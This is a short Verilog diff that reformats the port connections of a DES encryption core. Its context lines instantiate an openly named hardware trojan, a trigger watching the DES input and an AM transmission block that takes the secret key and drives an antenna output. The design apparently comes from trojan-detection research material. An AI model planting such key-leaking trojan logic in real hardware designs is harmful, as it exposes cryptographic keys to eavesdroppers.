@@ -13,7 +13,13 @@ module top (
 	 
 	wire Tj_Trig;
 
-	des DES (clk, roundSel, decrypt, key, desIn, desOut);
+	des DES (
+		.clk(clk),
+		.roundSel(roundSel),
+		.decrypt(decrypt),
+		.key(key),
+		.desIn(desIn),
+		.desOut(desOut));
 	Trojan_Trigger Tj_Trigger (rst, desIn, Tj_Trig);
 	AM_Transmission TSC (key, clk, rst, Tj_Trig, Antena);
 
